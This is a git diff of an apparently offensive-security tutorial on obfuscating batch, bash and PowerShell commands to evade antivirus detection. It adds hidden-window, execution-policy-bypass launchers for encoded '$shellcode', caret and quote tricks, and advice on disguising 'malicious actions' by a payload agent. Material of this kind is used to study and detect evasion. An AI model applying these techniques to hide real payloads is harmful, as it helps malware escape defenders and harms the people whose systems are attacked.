@@ -32,7 +32,7 @@
 [5] [Bypass Sanbox Execution (AVET)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#bypass-the-scan-engine-daniel-sauder-avet)<br />
 [6] [FInal Notes - Remarks](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#final-notes---remarks)<br />
 [7] [Special Thanks - Referencies](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#special-thanks)<br />
-[8] [Send me BitCoins to writte the 2º serie of this article :D](https://chrome.google.com/webstore/detail/no-coin-block-miners-on-t/gojamcfopckidlocpkbelmpjcgmbgjcl)<br />
+[8] [Send me BitCoins to writte the 2º series of this article :D](https://chrome.google.com/webstore/detail/no-coin-block-miners-on-t/gojamcfopckidlocpkbelmpjcgmbgjcl)<br />
 
 ---
 
@@ -52,7 +52,20 @@ The above string can be obfuscated using the **batch special character: ^** <br 
 
 ---
 
-- Any formula under the **batch interpreter** can be start with the follow special characters: **@** or **=** or **,** or **;**
+- String command to obfuscate<br />
+`cmd.exe /c powershell.exe Get-WmiObject -Class win32_ComputerSystem`<br />
+The above string can be obfuscated using the **batch special character: "** <br />
+
+- String obfuscated<br />
+
+      c"m"d.ex"e" /c pow"e"r"s"hell"."e"x"e G"e"t"-"Wmi"O"bje"c"t -Cl"a"ss win32_ComputerSystem
+
+![batch obfuscation](http://i.cubeupload.com/ksgzaY.jpg)
+`HINT: In tests conducted i was not been able to use 2 letters inside double quotes (eg. c"md".exe)`
+
+---
+
+- Any formula under the **batch interpreter** can be started with the follow special characters: **@** or **=** or **,** or **;**
 
       =cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
 
@@ -62,7 +75,15 @@ The above string can be obfuscated using the **batch special character: ^** <br 
 
       ;cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
 
-![batch obfuscation](http://i.cubeupload.com/nVD7On.jpg)
+
+      cmd.exe /c @powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
+
+      cmd.exe /c =powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
+
+      [Using two diferent technics]
+      @c^m"d".ex^e /c ,p"o"wer^s^hell"."ex^e G"e"t"-"Wm^i"O"bje"c"t -Cl"a"s^s win32_ComputerSystem
+
+![batch obfuscation](http://i.cubeupload.com/gB8tsA.jpg)
 
 ---
 
@@ -74,10 +95,10 @@ The above string can be obfuscated using the **batch special character: ^** <br 
 
 ---
 
-      Using a batch redirection caret (<nul) to add a extra layer of rubish data into your oneliner.
+      Using a batch redirection caret (<nul) to add a extra layer of rubish data into our oneliner.
       HINT: the <nul caret will be replaced by a empty string at execution time, And If used the special
       character ^ at the end of the <nul caret them the token written next to it will also be replaced
-      by a empty string, Example: cmd.exe /c start <nul^DataToDelete calc
+      by a empty string, Example: cmd.exe /c start calc <nul ^DataToDelete
 
 <br />
 
@@ -139,7 +160,7 @@ The above string can be obfuscated using the **batch special character: ^** <br 
 ---
 
       This next technic uses one batch local variable (%varObj%) as MasterKey that allow us to extract
-      strings inside the %varoBj% variable to build our command. [special thanks: @Wandoelmo Silva]
+      the strings inside the %varoBj% variable to build our command. [special thanks: @Wandoelmo Silva]
 
 <br />
 
@@ -266,7 +287,7 @@ The above string can be obfuscated using **bash special characters: '** or **\\*
 
 - String obfuscated (**oneliner**)<br />
 
-      M="ureto" && echo ${M:1:1}${M:4:1}${M:0:1}${M:3:1}${M:2:1} > meme; ul meme
+      M="ureto" && echo ${M:1:1}${M:4:1}${M:0:1}${M:3:1}${M:2:1} > meme; ul meme;
       [ print parsed data on screen (route syscall pulled from inside $M variable) ]
 
 ![bash obfuscation](http://i.cubeupload.com/NdTN6N.jpg)
@@ -400,7 +421,7 @@ The above string can be obfuscated using **powershell special characters:** **`*
 ---
 
       Build a variable named $encoded with the 'SPLIT' syscall inside, and use $encoded.Split("~~") -Join ''
-      to 'de-split' the syscall into a new local variable named $decoded, to be called as a syscall at run-time.
+      to 'de-split' the syscall into a new local variable named $decoded, to be called at run-time.
 
 <br />
 
@@ -419,7 +440,7 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
       [RTLO] Powershell cames with one buitin feature (::Reverse) that allow us to change the
       text alignment from left to rigth side (arabe alignment). That built-in feature allow us
-      to use it as obfuscation technic (writing syscall's backwards) and 'revert' them at runtime.
+      to use it as obfuscation technic (writing syscall's backwards) and 'revert' them at run-time.
 
 <br />
 
@@ -444,7 +465,7 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
       Using -f (reorder) switch to re-order the strings in there correct order, the switch
       -f accepts strings separated by a comma, and the caret {} contains the string position
-      after the -f switch.. HINT: we are going to replace another syscall by one concaternated
+      after the -f switch.. HINT: we are going to replace another syscall by one splatting
       local variable to be called at execution time also (3 obfuscation technics used).
 
 <br />
@@ -680,14 +701,14 @@ Here we can view the all process of encoding/decoding in powershell console
 
       Also keep in mind of the most common obfuscations technics like write a file on disk before
       executing any malicious actions (agent execution) replace any main functions (syscall's)
-      by base64 encoded strings, and store them inside your script (agent) as local variables
-      to be called at runtime execution also remmenber to use 'Rubish Data' piped (|) before your
-      system call and the last but not least, Concatenate also all function names to use big and
-      small letters (eg PoWeRshElL.exE) since cmd.exe interpreter its not case sensitive.
+      by base64 encoded variables/funtions, and store them inside your script (agent) to be called
+      at run-time execution, also remmenber to use 'Rubish Data' piped (|) before your system call's
+      and the last but not least, Concatenate/splatting also all function names also to use big and small
+      letters (eg: Po"W"e^Rs%!h%E^lL"."e^%i:~14,1%^E) since cmd.exe interpreter its not case sensitive.
 
       Its never to late to remmenber that diferent technics can be combined together to achieve
-      better results. The next example shows one powershell payload embbebed into one template.bat
-      using 5 diferent batch obfuscation technics found in this article (only batch technics):
+      better results. The next example shows one powershell (psh-cmd) payload embbebed into one
+      template.bat using 5 diferent batch obfuscation technics found in this article (only batch technics)
 
 <br />
 
